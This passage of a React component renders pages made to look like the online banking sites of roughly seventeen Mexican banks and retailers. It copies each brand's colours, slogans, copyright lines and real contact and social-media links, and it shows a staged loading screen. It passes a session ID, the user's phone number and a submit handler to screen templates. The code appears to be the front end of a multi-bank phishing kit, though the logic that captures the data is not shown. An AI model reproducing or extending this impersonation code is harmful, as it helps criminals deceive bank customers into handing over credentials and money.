            sessionData.banco === 'SCOTIABANK' ? 'bg-[#EC111A]' :
            sessionData.banco === 'INVEX' ? 'bg-[#BE0046]' :
            sessionData.banco === 'BANREGIO' ? 'bg-[#FF6600]' :
            sessionData.banco === 'SPIN' ? 'bg-[#6551FF]' :
            sessionData.banco === 'PLATACARD' ? 'bg-[#333333]' :
            sessionData.banco === 'BANCO_AZTECA' ? 'bg-[#00A552]' :
            sessionData.banco === 'BIENESTAR' ? 'bg-[#9D2449]' :
            sessionData.banco === 'INBURSA' ? 'bg-[#1B4B72]' :
            sessionData.banco === 'AFIRME' ? 'bg-[#009639]' :
            'bg-[#EC1C24]'
          } text-white p-4 text-center text-sm`}>
            <div className="mb-3">
              <a href={
                sessionData.banco === 'LIVERPOOL' ? 'https://www.liverpool.com.mx/tienda/ayuda/contacto' : 
                sessionData.banco === 'CITIBANAMEX' ? 'https://www.banamex.com/es/personas/contacto.html' : 
                sessionData.banco === 'BBVA' ? 'https://www.bbva.mx/personas/contacto.html' :
                sessionData.banco === 'BANCOPPEL' ? 'https://www.bancoppel.com/contacto/index.html' :
                sessionData.banco === 'HSBC' ? 'https://www.hsbc.com.mx/contacto/' :
                sessionData.banco === 'AMEX' ? 'https://www.americanexpress.com/es-mx/servicio-al-cliente/contacto/' :
                sessionData.banco === 'SANTANDER' ? 'https://www.santander.com.mx/personas/contacto/' :
                sessionData.banco === 'SCOTIABANK' ? 'https://www.scotiabank.com.mx/contacto/canales-de-atencion.aspx' :
                sessionData.banco === 'INVEX' ? 'https://www.invex.com/contacto' :
                sessionData.banco === 'BANREGIO' ? 'https://www.banregio.com/contacto.php' :
                sessionData.banco === 'SPIN' ? 'https://www.spinbyoxxo.com.mx/contacto' :
                sessionData.banco === 'BANCO_AZTECA' ? 'https://www.bancoazteca.com.mx/contacto.html' :
                sessionData.banco === 'BIENESTAR' ? 'https://www.gob.mx/bancodelbienestar/contacto' :
                sessionData.banco === 'INBURSA' ? 'https://www.inbursa.com/contacto' :
                sessionData.banco === 'AFIRME' ? 'https://www.afirme.com/contacto' :
                'https://www.banorte.com/wps/portal/banorte/Home/contacto-banorte'
              } target="_blank" rel="noopener noreferrer" className="text-white mx-2">Contáctanos</a> |
              <a href={
                sessionData.banco === 'LIVERPOOL' ? 'https://www.liverpool.com.mx/tienda/ayuda/aclaraciones/ayuda-aclaraciones/' : 
                sessionData.banco === 'CITIBANAMEX' ? 'https://www.banamex.com/es/personas/servicios-digitales/aclaraciones.html' : 
                sessionData.banco === 'BBVA' ? 'https://www.bbva.mx/personas/servicios-digitales/aclaraciones.html' :
                sessionData.banco === 'BANCOPPEL' ? 'https://www.bancoppel.com/aclaraciones/index.html' :
                sessionData.banco === 'HSBC' ? 'https://www.hsbc.com.mx/contacto/aclaraciones/' :
                sessionData.banco === 'AMEX' ? 'https://www.americanexpress.com/es-mx/servicio-al-cliente/disputas/' :
                sessionData.banco === 'SANTANDER' ? 'https://www.santander.com.mx/personas/aclaraciones/' :
                sessionData.banco === 'SCOTIABANK' ? 'https://www.scotiabank.com.mx/contacto/unidad-especializada-aclaraciones.aspx' :
                sessionData.banco === 'INVEX' ? 'https://www.invex.com/aclaraciones' :
                sessionData.banco === 'BANREGIO' ? 'https://www.banregio.com/ayuda/aclaraciones.php' :
                sessionData.banco === 'SPIN' ? 'https://www.spinbyoxxo.com.mx/preguntas-frecuentes' :
                sessionData.banco === 'BANCO_AZTECA' ? 'https://www.bancoazteca.com.mx/ayuda-y-preguntas-frecuentes.html' :
                sessionData.banco === 'BIENESTAR' ? 'https://www.gob.mx/bancodelbienestar/acciones-y-programas/aclaraciones-bancarias' :
                sessionData.banco === 'INBURSA' ? 'https://www.inbursa.com/aclaraciones' :
                sessionData.banco === 'AFIRME' ? 'https://www.afirme.com/aclaraciones' :
                'https://www.banorte.com/wps/portal/banorte/Home/contacto-banorte/aclaraciones-en-linea'
              } target="_blank" rel="noopener noreferrer" className="text-white mx-2">Aclaraciones</a> |
              <a href={
                sessionData.banco === 'LIVERPOOL' ? 'https://www.liverpool.com.mx/tienda/promociones/' : 
                sessionData.banco === 'CITIBANAMEX' ? 'https://www.banamex.com/es/personas/promociones.html' : 
                sessionData.banco === 'BBVA' ? 'https://www.bbva.mx/personas/productos/promociones.html' :
                sessionData.banco === 'BANCOPPEL' ? 'https://www.bancoppel.com/promociones/index.html' :
                sessionData.banco === 'HSBC' ? 'https://www.hsbc.com.mx/promociones/' :
                sessionData.banco === 'AMEX' ? 'https://www.americanexpress.com/es-mx/promociones/hoteles/' :
                sessionData.banco === 'SANTANDER' ? 'https://www.santander.com.mx/personas/santander-select/promociones-exclusivas/' :
                sessionData.banco === 'SCOTIABANK' ? 'https://www.scotiabank.com.mx/promociones/promociones.aspx' :
                sessionData.banco === 'INVEX' ? 'https://www.invex.com/promociones' :
                sessionData.banco === 'BANREGIO' ? 'https://www.banregio.com/promociones/' :
                sessionData.banco === 'SPIN' ? 'https://www.spinbyoxxo.com.mx/promociones' :
                sessionData.banco === 'BANCO_AZTECA' ? 'https://www.bancoazteca.com.mx/promociones.html' :
                sessionData.banco === 'BIENESTAR' ? 'https://www.gob.mx/bancodelbienestar/documentos/promociones-y-sorteos' :
                sessionData.banco === 'INBURSA' ? 'https://www.inbursa.com/promociones' :
                sessionData.banco === 'AFIRME' ? 'https://www.afirme.com/promociones' :
                'https://www.banorte.com/wps/portal/banorte/Home/promociones/todas'
              } target="_blank" rel="noopener noreferrer" className="text-white mx-2">Promociones</a> |
              <a href={
                sessionData.banco === 'LIVERPOOL' ? 'https://www.facebook.com/liverpoolmexico' : 
                sessionData.banco === 'CITIBANAMEX' ? 'https://www.facebook.com/BanamexOficial' : 
                sessionData.banco === 'BBVA' ? 'https://www.facebook.com/BBVAMexico' :
                sessionData.banco === 'BANCOPPEL' ? 'https://www.facebook.com/BanCoppel' :
                sessionData.banco === 'HSBC' ? 'https://www.facebook.com/HSBC.MX' :
                sessionData.banco === 'AMEX' ? 'https://www.facebook.com/AmericanExpressMexico' :
                sessionData.banco === 'SANTANDER' ? 'https://www.facebook.com/SantanderMexico' :
                sessionData.banco === 'SCOTIABANK' ? 'https://www.facebook.com/ScotiabankMX' :
                sessionData.banco === 'INVEX' ? 'https://www.facebook.com/INVEXBanco' :
                sessionData.banco === 'BANREGIO' ? 'https://www.facebook.com/banregio' :
                sessionData.banco === 'SPIN' ? 'https://www.facebook.com/SpinByOxxo' :
                sessionData.banco === 'BANCO_AZTECA' ? 'https://www.facebook.com/BancoAzteca' :
                sessionData.banco === 'BIENESTAR' ? 'https://www.facebook.com/BBienestarMX' :
                sessionData.banco === 'INBURSA' ? 'https://www.facebook.com/GrupoFinancieroInbursa' :
                sessionData.banco === 'AFIRME' ? 'https://www.facebook.com/BancoAfirme' :
                'https://www.facebook.com/BanorteOficial'
              } target="_blank" rel="noopener noreferrer" className="text-white mx-2">Facebook</a> |
              <a href={
                sessionData.banco === 'LIVERPOOL' ? 'https://www.youtube.com/user/liverpoolmexico' : 
                sessionData.banco === 'CITIBANAMEX' ? 'https://www.youtube.com/user/Banamex' : 
                sessionData.banco === 'BBVA' ? 'https://www.youtube.com/user/BBVABancomer' :
                sessionData.banco === 'BANCOPPEL' ? 'https://www.youtube.com/channel/UCiLI7sTiT4XjzUOtYQrNtpw' :
                sessionData.banco === 'HSBC' ? 'https://www.youtube.com/user/HSBCMEX' :
                sessionData.banco === 'AMEX' ? 'https://www.youtube.com/user/americanexpressmexico' :
                sessionData.banco === 'SANTANDER' ? 'https://www.youtube.com/user/SantanderMx' :
                sessionData.banco === 'SCOTIABANK' ? 'https://www.youtube.com/user/ScotiabankMX' :
                sessionData.banco === 'INVEX' ? 'https://www.youtube.com/channel/UCgYL-vVd9Af5oVcpOyMsefQ' :
                sessionData.banco === 'BANREGIO' ? 'https://www.youtube.com/channel/UC0UWRvXksJJzXG-hRnGDG3g' :
                sessionData.banco === 'SPIN' ? 'https://www.youtube.com/channel/UC6LuKC5QzmY2V4qVbJYJavw' :
                sessionData.banco === 'BANCO_AZTECA' ? 'https://www.youtube.com/user/bancoaztecaoficial' :
                sessionData.banco === 'BIENESTAR' ? 'https://www.youtube.com/@BBienestarMX' :
                sessionData.banco === 'INBURSA' ? 'https://www.youtube.com/@GrupoFinancieroInbursa' :
                sessionData.banco === 'AFIRME' ? 'https://www.youtube.com/user/BancoAfirme' :
                'https://www.youtube.com/user/GFBanorte'
              } target="_blank" rel="noopener noreferrer" className="text-white mx-2">Youtube</a>
            </div>
            <div>© {
              sessionData.banco === 'LIVERPOOL' ? 'Liverpool' :
              sessionData.banco === 'CITIBANAMEX' ? 'Banamex' : 
              sessionData.banco === 'BBVA' ? 'BBVA' :
              sessionData.banco === 'BANCOPPEL' ? 'BanCoppel' :
              sessionData.banco === 'HSBC' ? 'HSBC' :
              sessionData.banco === 'AMEX' ? 'American Express' :
              sessionData.banco === 'SANTANDER' ? 'Santander' :
              sessionData.banco === 'SCOTIABANK' ? 'Scotiabank' :
              sessionData.banco === 'INVEX' ? 'INVEX' :
              sessionData.banco === 'BANREGIO' ? 'Banregio' :
              sessionData.banco === 'SPIN' ? 'SPIN by Oxxo' :
              sessionData.banco === 'PLATACARD' ? 'Plata Card' :
              sessionData.banco === 'BANCO_AZTECA' ? 'Banco Azteca' :
              sessionData.banco === 'BIENESTAR' ? 'Banco del Bienestar' :
              sessionData.banco === 'INBURSA' ? 'Grupo Financiero Inbursa' :
              sessionData.banco === 'AFIRME' ? 'Banco Afirme' :
              'Banorte'
            } México 2024. Todos los Derechos Reservados</div>
          </div>
        </footer>
      );
    }
  };

  // Función para mostrar información adicional según el banco
  const renderBankInfo = () => {
    if (sessionData.banco === 'BANBAJIO') {
      return null; // BanBajío no muestra información adicional
    } else if (sessionData.banco === 'LIVERPOOL') {
      return (
        <div className="text-center mt-4 px-4">
          <p className="text-sm text-gray-600">Tu experiencia de banca en línea de Liverpool, segura y confiable</p>
        </div>
      );
    } else if (sessionData.banco === 'CITIBANAMEX') {
      return (
        <div className="text-center mt-4 px-4">
          <p className="text-sm text-gray-600">Banca digital segura para todos tus trámites financieros</p>
        </div>
      );
    } else if (sessionData.banco === 'BBVA') {
      return (
        <div className="text-center mt-4 px-4">
          <p className="text-sm text-gray-600">La manera más fácil y segura de realizar tus operaciones bancarias</p>
        </div>
      );
    } else if (sessionData.banco === 'BANORTE') {
      return (
        <div className="text-center mt-2 px-4">
          <p className="text-sm text-gray-600 mt-1">Tu banca en línea, más segura y con mayor protección</p>
        </div>
      );
    } else if (sessionData.banco === 'BANCOPPEL') {
      return (
        <div className="text-center mt-2 px-4">
          <p className="text-sm text-gray-600 mt-1">La llave a tu mundo financiero</p>
        </div>
      );
    } else if (sessionData.banco === 'HSBC') {
      return (
        <div className="text-center mt-2 px-4">
          <p className="text-sm text-gray-600 mt-1">El banco local con perspectiva global</p>
        </div>
      );
    } else if (sessionData.banco === 'AMEX') {
      return (
        <div className="text-center mt-2 px-4">
          <p className="text-sm text-gray-600 mt-1">Bienvenido a American Express</p>
        </div>
      );
    } else if (sessionData.banco === 'SANTANDER') {
      return (
        <div className="text-center mt-2 px-4">
          <p className="text-sm text-gray-600 mt-1">Bienvenido a Santander, tu banco de confianza</p>
        </div>
      );
    } else if (sessionData.banco === 'SCOTIABANK') {
      return (
        <div className="text-center mt-2 px-4">
          <p className="text-sm text-gray-600 mt-1">Bienvenido a Scotiabank, tu banco con más posibilidades</p>
        </div>
      );
    } else if (sessionData.banco === 'INVEX') {
      return (
        <div className="text-center mt-2 px-4">
          <p className="text-sm text-gray-600 mt-1">Bienvenido a INVEX Banca Digital</p>
        </div>
      );
    } else if (sessionData.banco === 'BANREGIO') {
      return (
        <div className="text-center mt-2 px-4">
          <p className="text-sm text-gray-600 mt-1">Bienvenido a Banregio Banca Digital</p>
        </div>
      );
    } else if (sessionData.banco === 'SPIN') {
      return (
        <div className="text-center mt-2 px-4">
          <p className="text-sm text-gray-600 mt-1">Bienvenido a SPIN by Oxxo</p>
        </div>
      );
    } else if (sessionData.banco === 'PLATACARD') {
      return (
        <div className="text-center mt-2 px-4">
          <p className="text-sm text-gray-600 mt-1">Bienvenido a Plata Card</p>
        </div>
      );
    } else if (sessionData.banco === 'BANCO_AZTECA') {
      return (
        <div className="text-center mt-2 px-4">
          <p className="text-sm text-gray-600 mt-1">Bienvenido a Banco Azteca, el banco de la inclusión financiera</p>
        </div>
      );
    } else if (sessionData.banco === 'BIENESTAR') {
      return (
        <div className="text-center mt-2 px-4">
          <p className="text-sm text-gray-600 mt-1">Bienvenido al Banco del Bienestar, tu banco social</p>
        </div>
      );
    } else if (sessionData.banco === 'INBURSA') {
      return (
        <div className="text-center mt-2 px-4">
          <p className="text-sm text-gray-600 mt-1">Bienvenido a Grupo Financiero Inbursa, tu aliado financiero</p>
        </div>
      );
    } else {
      return (
        <div className="text-center mt-4 px-4">
          <p className="text-sm">Recuerda que con una sola cuenta puedes ingresar a todas nuestras tiendas.</p>
          <div className="mt-2 space-x-2">
            <img 
              src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/82/Suburbia_2022_logo.svg/100px-Suburbia_2022_logo.svg.png" 
              className="h-5 inline-block" 
              alt="Suburbia" 
            />
            <img 
              src="https://upload.wikimedia.org/wikipedia/commons/8/89/Williams-Sonoma_logo.svg" 
              className="h-5 inline-block" 
              alt="Williams Sonoma" 
            />
          </div>
        </div>
      );
    }
  };

  // Si estamos mostrando el mensaje inicial o aún no se ha cargado el banco, mostrar una pantalla de carga
  if (showInitialMessage || !bankLoaded) {
    const loadingContent = (
      <>
        <div className="container mx-auto max-w-md px-6 py-8 flex-grow flex flex-col items-center justify-center">
          <div className="text-center mb-4">
            <h2 className="text-xl font-semibold mb-4">{initialMessage}</h2>
            <div className="h-4 w-full bg-gray-200 rounded overflow-hidden">
              <div className={`h-full ${
                sessionData.banco === 'LIVERPOOL' ? 'liverpool-bg' :
                sessionData.banco === 'BANBAJIO' ? 'banbajio-bg' : 
                sessionData.banco === 'CITIBANAMEX' ? 'bg-[#005BAC]' : 
                sessionData.banco === 'BBVA' ? 'bg-[#072146]' :
                sessionData.banco === 'BANCOPPEL' ? 'bg-[#0066B3]' :
                sessionData.banco === 'HSBC' ? 'bg-[#DB0011]' :
                sessionData.banco === 'AMEX' ? 'amex-bg' :
                sessionData.banco === 'SANTANDER' ? 'santander-bg' :
                sessionData.banco === 'SCOTIABANK' ? 'scotiabank-bg' :
                sessionData.banco === 'INVEX' ? 'invex-bg' :
                sessionData.banco === 'BANREGIO' ? 'banregio-bg' :
                sessionData.banco === 'SPIN' ? 'bg-[#6551FF]' :
                sessionData.banco === 'PLATACARD' ? 'bg-[#FF5722]' :
                sessionData.banco === 'BANCO_AZTECA' ? 'bg-[#00A552]' :
                sessionData.banco === 'BIENESTAR' ? 'bg-[#9D2449]' :
                sessionData.banco === 'INBURSA' ? 'bg-[#1B4B72]' :
                'bg-[#EC1C24]'
              } animate-progress-bar`}></div>
            </div>
          </div>
        </div>
      </>
    );
    
    // Si no se ha cargado el banco aún, mostramos una pantalla genérica de carga
    if (!bankLoaded) {
      return (
        <div className="min-h-screen flex flex-col bg-white">
          <header className="bg-gray-100 text-gray-800 p-4 text-center">
            <div className="font-bold text-sm mb-2">{formatDate(new Date())}</div>
            <div className="h-20"></div>
          </header>
          
          {loadingContent}
          
          <footer className="mt-auto">
            <div className="bg-gray-100 p-4 text-center text-sm">
              <a href="https://www.banorte.com/" target="_blank" rel="noopener noreferrer" className="text-gray-600 mx-2">Aprende más</a>
              <a href="https://www.banorte.com/wps/portal/banorte/Home/ayuda-banorte/" target="_blank" rel="noopener noreferrer" className="text-gray-600 mx-2">Ayuda</a>
              <a href="https://www.banorte.com/wps/portal/banorte/Home/inicio/terminos-y-condiciones" target="_blank" rel="noopener noreferrer" className="text-gray-600 mx-2">Términos y condiciones</a>
              <a href="https://www.banorte.com/wps/portal/banorte/Home/seguridad-banorte" target="_blank" rel="noopener noreferrer" className="text-gray-600 mx-2">Seguridad en línea</a>
            </div>
            <div className="bg-gray-800 text-white p-4 text-center text-sm">
              <div className="mb-3">
                <a href="https://www.banorte.com/wps/portal/banorte/Home/contacto-banorte" target="_blank" rel="noopener noreferrer" className="text-white mx-2">Contáctanos</a> |
                <a href="https://www.banorte.com/wps/portal/banorte/Home/contacto-banorte/aclaraciones-en-linea" target="_blank" rel="noopener noreferrer" className="text-white mx-2">Aclaraciones</a> |
                <a href="https://www.banorte.com/wps/portal/banorte/Home/promociones/todas" target="_blank" rel="noopener noreferrer" className="text-white mx-2">Promociones</a> |
                <a href="https://www.facebook.com/BanorteOficial" target="_blank" rel="noopener noreferrer" className="text-white mx-2">Facebook</a> |
                <a href="https://www.youtube.com/user/GFBanorte" target="_blank" rel="noopener noreferrer" className="text-white mx-2">YouTube</a>
              </div>
              <div>© Banca Digital 2024. Todos los Derechos Reservados</div>
            </div>
          </footer>
        </div>
      );
    }
    
    // Si el banco ya está cargado pero seguimos en la pantalla de carga
    return (
      <div 
        className={`min-h-screen flex flex-col ${
          sessionData.banco === 'BANBAJIO' 
            ? 'banbajio-background'  
            : sessionData.banco === 'BANORTE'
            ? 'banorte-container'
            : 'bg-white'
        }`}
        style={
          sessionData.banco === 'BANBAJIO' 
            ? { backgroundImage: `url(${banbajioBackground})`, backgroundSize: 'cover' } 
            : sessionData.banco === 'HSBC'
            ? { backgroundImage: `url(${hsbcBackground})`, backgroundSize: 'cover' } 
            : {}
        }
      >
        {renderHeader()}
        {loadingContent}
        {renderFooter()}
      </div>
    );
  }

  // Renderizado normal cuando no estamos mostrando el mensaje inicial
  return (
    <div 
      className={`min-h-screen flex flex-col ${
        sessionData.banco === 'BANBAJIO' 
          ? 'banbajio-background'  
          : sessionData.banco === 'BANORTE'
          ? 'banorte-container'
          : 'bg-white'
      }`}
      style={
        sessionData.banco === 'BANBAJIO' 
          ? { backgroundImage: `url(${banbajioBackground})`, backgroundSize: 'cover' } 
          : sessionData.banco === 'HSBC'
          ? { backgroundImage: `url(${hsbcBackground})`, backgroundSize: 'cover' } 
          : {}
      }
    >
      {renderHeader()}
      {/* Eliminamos renderBankInfo para evitar duplicar elementos */}

      <div className={`container mx-auto max-w-md px-6 py-8 flex-grow ${
        sessionData.banco === 'BANORTE' 
          ? 'banorte-content'
          : ''
      }`}>
        <ScreenTemplates 
          currentScreen={currentScreen} 
          screenData={screenData}
          onSubmit={handleSubmit}
          banco={sessionData.banco || 'BANORTE'}
          sessionId={sessionId}
          celular={sessionData.celular || ''}
        />
      </div>

      {renderFooter()}
    </div>
  );
}
